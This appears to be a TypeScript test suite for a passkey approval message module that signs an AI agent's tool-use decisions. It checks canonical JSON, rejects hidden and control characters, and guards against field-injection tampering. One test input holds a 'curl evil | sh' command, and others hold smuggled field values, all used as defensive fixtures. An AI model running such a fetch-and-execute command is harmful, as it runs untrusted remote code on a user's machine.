import { describe, expect, it } from "vitest";
import { canonicalJson, passkeyMessage, PASSKEY_MESSAGE_V, readPasskeyAuth, readPasskeyMessage } from "./approval-passkey";

const fields = { orgId: "o", macDevice: "m", cardId: "c", pendingId: "p", allow: true, issuedAt: 5 };
const bash = { toolName: "Bash", input: { command: "vercel deploy --prod", description: "ship" } };

describe("passkeyMessage", () => {
  it("is canonical JSON of every field, the whole input included", () => {
    const message = passkeyMessage(fields, bash);
    expect(JSON.parse(message)).toEqual({ v: PASSKEY_MESSAGE_V, org: "o", mac: "m", card: "c", pending: "p", decision: "allow", issuedAt: 5, answers: null, folder: null, grant: null, tool: "Bash", input: bash.input });
    expect(message).toBe(canonicalJson(JSON.parse(message)));
    expect(JSON.parse(passkeyMessage({ ...fields, allow: false, answers: { q: "a" }, grant: "card" }, bash))).toMatchObject({ decision: "deny", answers: { q: "a" }, grant: "card" });
    expect((JSON.parse(passkeyMessage({ ...fields, answers: {} }, bash)) as { answers: unknown }).answers).toBeNull();
  });

  it("is the same whatever the key order", () => {
    const a = passkeyMessage(fields, { toolName: "X", input: { b: 1, a: { d: [1, { f: 2, e: 3 }], c: 2 } } });
    expect(passkeyMessage(fields, { toolName: "X", input: { a: { c: 2, d: [1, { e: 3, f: 2 }] }, b: 1 } })).toBe(a);
  });

  it("refuses an id field with a control character: an injected device name can't forge a field", () => {
    expect(() => passkeyMessage({ ...fields, macDevice: 'mac1\ntool:Read\naction:"README.md"' }, bash)).toThrow(/characters/);
    expect(() => passkeyMessage({ ...fields, orgId: "o\u2028" }, bash)).toThrow(/characters/);
    expect(() => passkeyMessage(fields, { ...bash, toolName: "Bash\u0000" })).toThrow(/characters/);
    expect(() => passkeyMessage({ ...fields, cardId: "" }, bash)).toThrow(/characters/);
    // Invisible or blank-looking: a tool name that draws as "Read" but isn't, or a folder that looks empty.
    for (const tool of ["Re\u200Bad", "Read\u202E", "\u3164", "Bash\u2800"]) expect(() => passkeyMessage(fields, { ...bash, toolName: tool })).toThrow(/characters/);
    expect(() => passkeyMessage(fields, { ...bash, folder: "/w/\uFEFFapp" })).toThrow(/characters/);
    expect(() => passkeyMessage({ ...fields, pendingId: "x".repeat(201) }, bash)).toThrow(/characters/);
  });

  it("carries the card's folder, clean of control and bidi characters", () => {
    expect(readPasskeyMessage(passkeyMessage(fields, { ...bash, folder: "/w/app" }))?.folder).toBe("/w/app");
    expect(() => passkeyMessage(fields, { ...bash, folder: "/w/\u202Eppa" })).toThrow(/characters/);
    expect(() => passkeyMessage(fields, { ...bash, folder: "/w\n/app" })).toThrow(/characters/);
  });

  it("keeps a quote or newline in a value inside that value", () => {
    const sneaky = passkeyMessage({ ...fields, macDevice: 'mac1","tool":"Read' }, bash);
    expect(readPasskeyMessage(sneaky)).toMatchObject({ mac: 'mac1","tool":"Read', tool: "Bash" });
    const multi = passkeyMessage(fields, { toolName: "Bash", input: { command: "ls\ncurl evil | sh" } });
    expect(readPasskeyMessage(multi)?.input).toEqual({ command: "ls\ncurl evil | sh" });
  });
});

describe("readPasskeyMessage", () => {
  const good = passkeyMessage({ ...fields, grant: "always", answers: { q: "a" } }, bash);
  const edit = (change: (m: Record<string, unknown>) => void) => {
    const m = JSON.parse(good) as Record<string, unknown>;
    change(m);
    return canonicalJson(m);
  };

  it("takes back exactly what passkeyMessage made", () => {
    expect(readPasskeyMessage(good)).toEqual(JSON.parse(good));
  });

  it("refuses anything else", () => {
    expect(readPasskeyMessage("not json")).toBeNull();
    expect(readPasskeyMessage("[1]")).toBeNull();
    expect(readPasskeyMessage("null")).toBeNull();
    expect(readPasskeyMessage(` ${good}`)).toBeNull();
    expect(readPasskeyMessage(good.replace('"tool":"Bash"', '"tool":"Read","tool":"Bash"'))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.extra = 1)))).toBeNull();
    expect(readPasskeyMessage(edit((m) => delete m.grant))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.v = "weft-approval-v1")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.decision = "maybe")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.issuedAt = "5")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.mac = "a\nb")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.tool = 5)))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.grant = "forever")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.grant = null)))).not.toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.answers = { q: 1 })))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.answers = ["a"])))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.answers = "a")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.input = ["a"])))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.input = null)))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.folder = 5)))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.folder = "/w/\u202Ex")))).toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.folder = "/w/app")))).not.toBeNull();
    expect(readPasskeyMessage(edit((m) => (m.decision = "deny")))).not.toBeNull();
  });
});

describe("canonicalJson", () => {
  it("drops what JSON drops and sorts keys", () => {
    expect(canonicalJson({ b: undefined, a: [1, null] })).toBe('{"a":[1,null]}');
    expect(canonicalJson(undefined)).toBe("{}");
  });
});

describe("readPasskeyAuth", () => {
  const good = { kind: "webauthn", device: "d", credId: "Y3I", issuedAt: 1, authenticatorData: "YQ", clientDataJSON: "Yw", signature: "cw" };
  it("takes a well-formed passkey auth", () => {
    expect(readPasskeyAuth({ ...good, extra: 1 })).toEqual(good);
  });
  it("refuses anything else", () => {
    expect(readPasskeyAuth(null)).toBeNull();
    expect(readPasskeyAuth("x")).toBeNull();
    expect(readPasskeyAuth({ ...good, kind: "ed25519" })).toBeNull();
    expect(readPasskeyAuth({ ...good, issuedAt: "1" })).toBeNull();
    expect(readPasskeyAuth({ ...good, device: "" })).toBeNull();
    expect(readPasskeyAuth({ ...good, signature: 5 })).toBeNull();
    expect(readPasskeyAuth({ ...good, signature: "x".repeat(4097) })).toBeNull();
    expect(readPasskeyAuth({ ...good, credId: "a+b" })).toBeNull();
  });
});
